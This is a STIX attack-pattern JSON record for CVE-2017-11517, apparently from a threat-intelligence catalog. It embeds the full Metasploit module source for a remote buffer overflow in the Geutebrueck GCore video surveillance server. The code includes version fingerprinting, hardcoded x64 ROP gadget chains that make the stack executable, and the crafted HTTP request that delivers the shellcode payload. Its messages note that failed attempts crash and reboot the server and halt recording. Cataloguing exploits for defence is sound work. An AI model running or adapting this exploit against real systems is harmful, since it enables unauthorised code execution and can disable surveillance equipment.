{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3350c367-ba13-4a9c-a23f-a48ea8d3ea62",
    "created": "2024-08-14T16:55:09.517604Z",
    "modified": "2024-08-14T16:55:09.517609Z",
    "name": "Geutebrueck GCore - GCoreServer.exe Buffer Overflow RCE",
    "description": " This module exploits a stack Buffer Overflow in the GCore server (GCoreServer.exe). The vulnerable webserver is running on Port 13003 and Port 13004, does not require authentication and affects all versions from 2003 till July 2016 (Version 1.4.YYYYY).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/geutebrueck_gcore_x64_rce_bo.rb",
            "external_id": "geutebrueck_gcore_x64_rce_bo.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-11517"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\nrequire 'open-uri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::Tcp\n\n  Rank = NormalRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Geutebrueck GCore - GCoreServer.exe Buffer Overflow RCE',\n      'Description'\t=> %q{\n        This module exploits a stack Buffer Overflow in the GCore server (GCoreServer.exe).\n        The vulnerable webserver is running on Port 13003 and Port 13004, does not require\n        authentication and affects all versions from 2003 till July 2016 (Version 1.4.YYYYY).\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\n      [\n        'Luca Cappiello',\n        'Maurice Popp'\n      ],\n      'References' =>\n      [\n        ['EDB','41153'],\n        ['CVE', '2017-11517'],\n        ['URL','www.geutebrueck.com']\n      ],\n      'Platform' => 'win',\n      'Targets' =>\n      [\n        ['Automatic Targeting', { 'auto' => true, 'Arch' => ARCH_X64 }],\n        ['GCore 1.3.8.42, Windows x64 (Win7+)', { 'Arch' => ARCH_X64}],\n        ['GCore 1.4.2.37, Windows x64 (Win7+)', { 'Arch' => ARCH_X64}]\n      ],\n      'Payload' =>\n      {\n        'Space' => '2000'\n      },\n      'Privileged' => true,\n      'DisclosureDate' => '2017-01-24',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [Opt::RPORT(13003)]\n      )\n    end\n\n    def fingerprint\n      print_status(\"Trying to fingerprint server with http://#{datastore['RHOST']}:#{datastore['RPORT']}/statistics/runningmoduleslist.xml...\")\n      @doc = Nokogiri::XML(open(\"http://#{datastore['RHOST']}:#{datastore['RPORT']}/statistics/runningmoduleslist.xml\"))\n      statistics = @doc.css('modulestate')\n      statistics.each do |x|\n        if (x.to_s.include? 'GCoreServer') && (x.to_s.include? '1.3.8.42')\n          mytarget = targets[1]\n          print_status(\"Vulnerable version detected: #{mytarget.name}\")\n          return Exploit::CheckCode::Appears, mytarget\n        elsif (x.to_s.include? 'GCoreServer') && (x.to_s.include? '1.4.2.37')\n          mytarget = targets[2]\n          print_status(\"Vulnerable version detected: #{mytarget.name}\")\n          return Exploit::CheckCode::Appears, mytarget\n        end\n      end\n      print_status(\"Statistics Page under http://#{datastore['RHOST']}:#{datastore['RPORT']}/statistics/runningmoduleslist.xml is not available.\")\n      print_status('Make sure that you know the exact version, otherwise you\\'ll knock out the service.')\n      print_status('In the default configuration the service will restart after 1 minute and after the third crash the server will reboot!')\n      print_status('After a crash, the videosurveillance system can not recover properly and stops recording.')\n      [Exploit::CheckCode::Unknown, nil]\n    end\n\n    def check\n      fingerprint\n    end\n\n    def ropchain(target)\n      rop = ''\n      # These bytes \"\\x43\" are sacrificed ; we align the stack to jump over this messed up crap.\n      stack_align = \"\\x43\" * 16\n\n      if target.name.include? '1.3.8.42'\n        print_status('Preparing ROP chain for target 1.3.8.42!')\n\n        # 0x140cd00a9 | add rsp, 0x10 ; ret\n        # This is needed because the next 16 bytes are sometimes messed up.\n        overwrite = [0x140cd00a9].pack('Q<')\n\n        # We have 40 bytes left to align our stack!\n        # The most reliable way to align our stack is to save the value of rsp in another register, do some calculations\n        # and to restore it.\n        # We save RSP to RDX. Even if we use ESP/EDX registers in the instruction, it still works because the values are small enough.\n\n        # 0x1404e5cbf: mov edx, esp ; ret\n        stack_align << [0x1404e5cbf].pack('Q<')\n\n        # As no useful \"sub rdx, xxx\" or \"sub rsp, xxx\" gadget were found, we use the add instruction with a negative value.\n        # We pop -XXXXX as \\xxxxxxxxx to rax\n        # 0x14013db94  pop rax ; ret\n        stack_align << [0x14013db94].pack('Q<')\n        stack_align << [0xFFFFFFFFFFFFF061].pack('Q<')\n\n        # Our value is enough.\n        # 0x1407dc547  | add rax,rdx ; ret\n        stack_align << [0x1407dc547].pack('Q<')\n\n        # RSP gets restored with the new value. The return instruction doesn't break our ropchain and continues -XXXXX back.\n        # 0x140ce9ac0 | mov rsp, rax ; ..... ; ret\n        stack_align << [0x140ce9ac0].pack('Q<')\n\n        # Virtualprotect Call for 64 Bit calling convention. Needs RCX, RDX, R8 and R9.\n        # We want RCX to hold the value for VP Argument \"Address of Shellcode\"\n        # 0x140cc2234 |  mov rcx, rax ; mov rax, qword [rcx+0x00000108] ; add rsp, 0x28 ; ret  ;\n        rop << [0x140cc2234].pack('Q<')\n        rop << [0x4141414141414141].pack('Q<') * 5 # needed because of the stack aliging with \"add rsp, 0x28\" ;\n        # 0x1400ae2ae    | POP RDX; RETN\n        # 0x...1000      | Value for VP \"Size of Memory\"\n        rop << [0x1400ae2ae].pack('Q<')\n        rop << [0x0000000000000400].pack('Q<')\n\n        # 0x14029dc6e:   | POP R8; RET\n        # 0x...40        | Value for VP \"Execute Permissions\"\n        rop << [0x14029dc6e].pack('Q<')\n        rop << [0x0000000000000040].pack('Q<')\n\n        # 0x1400aa030    | POP R9; RET\n        # 0x1409AE1A8 is the .data section of gcore\n        rop << [0x1400aa030].pack('Q<')\n        rop << [0x1409AE1A8].pack('Q<')\n\n        # 0x140b5927a: xor rax, rax ; ret\n        rop << [0x140b5927a].pack('Q<')\n\n        # 0x1402ce220 pop rax ; ret\n        # 0x140d752b8 | VP Stub IAT Entry\n        rop << [0x1402ce220].pack('Q<')\n        rop << [0x140d752b8].pack('Q<')\n\n        # 0x1407c6b3b mov rax, qword [rax] ; ret  ;\n        rop << [0x1407c6b3b].pack('Q<')\n\n        # 0x140989c41 push rax; ret\n        rop << [0x140989c41].pack('Q<')\n\n        # 0x1406d684d jmp rsp\n        rop << [0x1406d684d].pack('Q<')\n\n        [rop, overwrite, stack_align]\n\n      elsif target.name.include? '1.4.2.37'\n        print_status('Preparing ROP chain for target 1.4.2.37!')\n\n        # 0x140cd9759 | add rsp, 0x10 ; ret\n        # This is needed because the next 16 bytes are sometimes messed up.\n        overwrite = [0x140cd9759].pack('Q<')\n\n        # We have 40 bytes left to align our stack!\n        # The most reliable way to align our stack is to save the value of rsp in another register, do some calculations\n        # and to restore it.\n        # We save RSP to RDX. Even if we use ESP/EDX registers in the instruction, it still works because the values are small enough.\n\n        # 0x1404f213f: mov edx, esp ; ret\n        stack_align << [0x1404f213f].pack('Q<')\n\n        # As no useful \"sub rdx, xxx\" or \"sub rsp, xxx\" gadget were found, we use the add instruction with a negative value.\n        # We pop -XXXXX as \\xxxxxxxxx to rax\n        # 0x14000efa8  pop rax ; ret\n        stack_align << [0x14000efa8].pack('Q<')\n        stack_align << [0xFFFFFFFFFFFFF061].pack('Q<')\n\n        # Our value is enough.\n        # 0x140cdfe65  | add rax,rdx ; ret\n        stack_align << [0x140cdfe65].pack('Q<')\n\n        # RSP gets restored with the new value. The return instruction doesn't break our ropchain and continues -XXXXX back.\n        # 0x140cf3110 | mov rsp, rax ; ..... ; ret\n        stack_align << [0x140cf3110].pack('Q<')\n\n        # Virtualprotect Call for 64 Bit calling convention. Needs RCX, RDX, R8 and R9.\n        # We want RCX to hold the value for VP Argument \"Address of Shellcode\"\n        # 0x140ccb984 |  mov rcx, rax ; mov rax, qword [rcx+0x00000108] ; add rsp, 0x28 ; ret  ;\n        rop << [0x140ccb984].pack('Q<')\n        rop << [0x4141414141414141].pack('Q<') * 5 # needed because of the stack aliging with \"add rsp, 0x28\" ;\n        # 0x14008f7ec      | POP RDX; RETN\n        # 0x...1000        | Value for VP \"Size of Memory\"\n        rop << [0x14008f7ec].pack('Q<')\n        rop << [0x0000000000000400].pack('Q<')\n\n        # 0x140a88f81:   | POP R8; RET\n        # 0x...40        | Value for VP \"Execute Permissions\"\n        rop << [0x140a88f81].pack('Q<')\n        rop << [0x0000000000000040].pack('Q<')\n\n        # 0x1400aa030    | POP R9; RET\n        # 0x...          | Value for VP \"Writeable location\". Not sure if needed?\n        # 0x140FB5000 is the .data section of gcore; let's test with this writable section...\n        rop << [0x1400aa030].pack('Q<')\n        rop << [0x140FB5000].pack('Q<')\n\n        # 0x140ccea2f: xor rax, rax ; et\n        rop << [0x140ccea2f].pack('Q<')\n\n        # 0x14000efa8 pop rax ; ret\n        # 0x140d83268 | VP Stub IAT Entry\n        rop << [0x14000efa8].pack('Q<')\n        rop << [0x140d83268].pack('Q<')\n\n        # 0x14095b254 mov rax, qword [rax] ; ret  ;\n        rop << [0x14095b254].pack('Q<')\n\n        # 0x140166c46 push rax; ret\n        rop << [0x140166c46].pack('Q<')\n\n        # 0x140cfb98d jmp rsp\n        rop << [0x140cfb98d].pack('Q<')\n\n        [rop, overwrite, stack_align]\n\n      else\n        print_status('ROP chain for this version not (yet) available or the target is not vulnerable.')\n      end\n    end\n\n    def exploit\n      if target['auto']\n        checkcode, target = fingerprint\n        fail_with(Failure::NotVulnerable, 'No vulnerable Version detected - exploit aborted.') if checkcode.to_s.include? 'unknown'\n        target_rop, target_overwrite, target_stack_align = ropchain(target)\n      else\n        print_status('No auto detection - be sure to choose the right version! Otherwise the service will crash, the system reboots and leaves the surveillance software in an undefined status.')\n        print_status(\"Selected version: #{self.target.name}\")\n        target_rop, target_overwrite, target_stack_align = ropchain(self.target)\n      end\n\n      begin\n        connect\n        print_status('Crafting Exploit...')\n        exploit = 'GET /'\n        exploit << \"\\x41\" * 200\n        exploit << target_rop\n        exploit << payload.encoded\n        exploit << \"\\x41\" * 1823\n        exploit << target_overwrite\n        exploit << target_stack_align\n\n        print_status('Exploit ready for sending...')\n        sock.put(exploit, 'Timeout' => 20)\n        print_status('Exploit sent!')\n        buf = sock.get_once || ''\n      rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n        elog('Exception encountered in \\'exploit\\'', error: e)\n      ensure\n        print_status('Closing socket.')\n        disconnect\n      end\n    end\n  end\n",
    "x_mitre_disclosure_date": "2017-01-24",
    "x_mitre_platforms": [
        "win'"
    ]
}